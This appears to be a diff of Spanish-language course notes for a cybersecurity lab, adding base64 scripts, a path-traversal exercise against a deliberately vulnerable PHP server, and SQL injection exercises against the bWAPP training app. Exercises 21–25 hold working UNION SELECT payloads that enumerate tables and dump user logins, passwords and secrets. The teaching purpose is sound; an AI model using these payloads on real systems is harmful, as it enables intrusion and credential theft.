@@ -1,5 +1,3 @@
-Autor: Daniel López &#x1F60E;&#x200D;&#x1F4BB;
-
 ### Ejercicio 1
 
 Crearemos un pequeño servidor en Python que sirva el `index.html` de la carpeta donde lo hayamos ejecutado. Para ello, usaremos un módulo existente en Python, colocamos la web en la carpeta `/var/www/html` o podemos servir lo que tengamos en cualquier web a través del comando:
@@ -132,9 +130,9 @@ function addNewItem(e) {
 	elementoLI.appendChild(document.createTextNode(input.value));
 	elementoUL.appendChild(elementoLI);
 	
-	//itemsAnadidos.push(input.value);
+	// itemsAnadidos.push(input.value);
 	
-	//localStorage.setItem("valores", JSON.stringify(itemsAnadidos));
+	// localStorage.setItem("valores", JSON.stringify(itemsAnadidos));
 }
 ```
 
@@ -202,11 +200,7 @@ var interval = setInterval(function() {
 setTimeout(function() {
 	clearInterval(interval);
 }, 10000);
-```
 
-Otro ejemplo, sobre cómo conocer el tipo de una variable:
-
-```javascript
 var test = true;
 
 if (typeof test == "string") {
@@ -236,7 +230,7 @@ Programa y prueba los dos scripts anteriores.
 import base64
 
 valor = (b"ciberseguridad")
-codificadoEnBase64=base64.b64encode(valor)
+codificadoEnBase64 = base64.b64encode(valor).decode("utf-8")
 print(codificadoEnBase64)
 ```
 
@@ -245,7 +239,7 @@ print(codificadoEnBase64)
 import base64
 
 valorEnBase64 = (b"Y2liZXJzZWd1cmlkYWQ=")
-decodificado = base64.b64decode(valorEnBase64)
+decodificado = base64.b64decode(valorEnBase64).decode("utf-8")
 print(decodificado)
 ```
 
@@ -254,7 +248,20 @@ print(decodificado)
 Ampliaremos de manera que el script recibe por parámetro de terminal el string a decodificar. Por tanto estudiaremos cómo gestionar los parámetros en Python.
 
 ```python
-# decoficado.py
+# main.py
+import base64
+import argparse
+
+try:
+   parser = argparse.ArgumentParser(description="Conversor de BASE64 a texto plano")
+   # Añadir argumentos a parse.
+   parser.add_argument("texto", type=str, help="Introduce una cadena")
+   # Pasar los argumentos.
+   args = parser.parse_args()
+   # Imprime en pantalla.
+   print(base64.b64decode(args.texto).decode("ascii"))
+except Exception as ex:
+   print("No es una cadena BASE64.")
 ```
 
 ### Ejercicio 11
@@ -306,13 +313,6 @@ function addNewItem(e) {
 
 Programar un script en python que aplique una decodificación de las CRC-16 CRC-32 MD2 MD4 MD5 SHA1 SHA224 SHA256 SHA384 SHA512 SHA512/224 SHA512/256 SHA3-224 SHA3-256 SHA3-384 SHA3-512 Base32 y Base64 a un string que le pasemos por parámetro. Ejemplo de ejecución: python3 ejercicio12.py 180049f3-5bd7-67fe-98f2-46a7ab9e9ed4
 
-La salida será: 
-crc-16: texto ilegible
-crc-32: texto ilegible
-md2: texto ilegible
-… datos interesantes
-… texto ilegible
-
 ### Ejercicio 13
 
 Creamos un pequeño servidor en PHP que devuelva el contenido del fichero que se le solicita por parámetro en la URL. Se trata de un pequeño servidor que no tiene control de acceso ninguno. Devuelve lo que se le solicita. Comprobaremos cómo al crear este servidor lo estaremos creando con la vulnerabilidad IDOR. Esta vulnerabilidad se conoce como Path Traversal, es decir recorrido de ficheros. OWASP documenta esta vulnerabilidad: https://owasp.org/www-community/attacks/Path_Traversal
@@ -347,7 +347,8 @@ Recuperamos el contenido de 1.txt. Pero podemos crear un script que compruebe si
 ```sh
 #set -x #depurando líneas
 for i in $(seq 1 10);do
-curl localhost:8000/index.php?a=$i.txt
+curl localhost:8000/index.php?parametro1=$i.txt
+echo ""
 sleep 1
 done
 ```
@@ -548,7 +549,7 @@ Vamos a arrancarlo y a interceptar algún ejemplo.
 
 Configuramos el proxy, para ello vamos a Herramientas -> Opciones -> Proxies Locales -> En el puerto establecemos el 9500. Y luego en Firefox:
 
-![img](https://lh3.googleusercontent.com/cBNATc-ALIHBsaZ0hm9UM5WYG59o9yA1YbDwhV_vrWtyfFNJNYQUWXWAFrC_fNemB1GL8H_wDzOWwyhyBBUpDkz59rDMqZKBZpcqpLGGwu0NeGvsZbVvwhKtqt987LMBzvIlzAn8gld2WPF87g)
+![](https://lh3.googleusercontent.com/cBNATc-ALIHBsaZ0hm9UM5WYG59o9yA1YbDwhV_vrWtyfFNJNYQUWXWAFrC_fNemB1GL8H_wDzOWwyhyBBUpDkz59rDMqZKBZpcqpLGGwu0NeGvsZbVvwhKtqt987LMBzvIlzAn8gld2WPF87g)
 
 Por último añadiremos un certificado creado por ZAP en el Firefox como autoridad. Iremos a ZAP -> Herramientas -> Certificados SSL Dinámicos -> Generamos y lo descargamos. Después lo importaremos en Firefox. El certificado lo guarda con el nombre: **owasp_zap_root_ca.cer**.
 
@@ -584,6 +585,71 @@ mysql -u root -p
 SELECT "Hola Mundo!";
 ```
 
+### Ejercicio 21
+
+Captura de pantalla comprobando el número de campos existentes.
+
+```sql
+aaa' union select 1,2,3,4,5,6,7 -- 
+```
+
+![](21.png)
+
+### Ejercicio 22
+
+Captura de pantalla mostrando cómo obtienes en el campo 2 el valor bWAPP. 
+
+```sql
+aaa' union select 1,database(),3,4,5,6,7 -- 
+```
+
+![](22.1.png)
+
+```sql
+kkk' union select 1,table_name,3,4,5,6,7 from INFORMATION_SCHEMA.TABLES where table_schema=database() -- 
+```
+
+![](22.2.png)
+
+### Ejercicio 23
+
+Captura de pantalla mostrando cómo obtienes los nombres de las columnas de la tabla users.
+
+```sql
+kkk' union select 1,column_name,3,4,5,6,7 from INFORMATION_SCHEMA.COLUMNS where table_name="users" AND table_schema=database() -- 
+```
+
+![](23.png)
+
+
+### Ejercicio 24
+
+Captura de pantalla mostrando cómo obtienes los valores de dos usuarios. Usuario AIM y usuario bee.
+
+```sql
+kkk' union select 1,login, password, email, secret, 6,7 from users -- 
+```
+
+![](24.png)
+
+![](24.2.png)
+
+### Ejercicio 25
+
+Captura de pantalla mostrando cómo obtienes el nombre de la BBDD pero usando únicamente el proceso de modificar la URL.
+
+```http
+http://192.168.1.203/bWAPP/sqli_2.php?movie=-3+union+select+1,database(),3,4,5,6,7&action=go
+```
+
+![](25.1.png)
+
+```http
+http://192.168.1.203/bWAPP//sqli_2.php?movie=-3+union+select+1,column_name,3,4,5,6,7+from+information_schema.columns+where+table_name=%27users%27+and+table_schema=database()+limit+1+offset+0&action=go
+```
+
+![](25.2.png)
+
 ## REPASO MYSQL
 
 A continuación, el siguiente paso es configurarla:
@@ -613,7 +679,7 @@ SELECT user, authentication_string, plugin, host FROM mysql.user;
 
 Por ejemplo, podemos observar que el usuario **root** se autentica usando el plugin **auth_socket**. Para configurar la cuenta **root** para autenticar con una contraseña, ejecute una instrucción `ALTER USER` para cambiar qué complemento de autenticación usa y establecer una contraseña nueva. 
 
-> 📝 Nota 📝: Corregir ERROR 1698 (28000): Access denied for user 'root'@'localhost' en MariaDB (MySQL).
+> 📝 NOTA 📝: Corregir ERROR 1698 (28000): Access denied for user 'root'@'localhost' en MariaDB (MySQL).
 > USE mysql;
 > UPDATE user SET plugin="mysql_native_password" WHERE user="root";
 > SELECT user, plugin FROM user;
@@ -760,11 +826,28 @@ La información de autenticación para la base de datos MySQL es:
 
 ### A1 - Control de acceso roto
 
-### A2 - Fallos criptográficos
+#### Ecommerce
 
-### A3 - Inyecciones SQL
+Registrar un usuario.
 
-### A4 - Diseño inseguro
+```shell
+# Linux
+curl -s -H "Content-Type: application/json" -d '{"username":"user1","password":"pass"}' http://localhost:10005/register
+# Windows
+curl "http://localhost:10005/register" -X POST -H "Content-Type: application/json" --data-raw "{""username"":""user2"",""password"":""user2""}
+```
+Iniciar sesión con usuario.
 
+```shell
+# Linux
+curl -s -H "Content-Type: application/json" -d '{"username":"user1","password":"pass"}' http://localhost:10005/login
+# Windows
+curl "http://localhost:10005/login" -X POST -H "Content-Type: application/json" --data-raw "{""username"":""user2"",""password"":""user2""}
+```
 
+#### Snake Pro
+
+```shell
+curl -vvv https://10.2.10.83:10005/ticket/a0954e79-af0c-47d9-89d4-ef5851b5dc40
+```
 
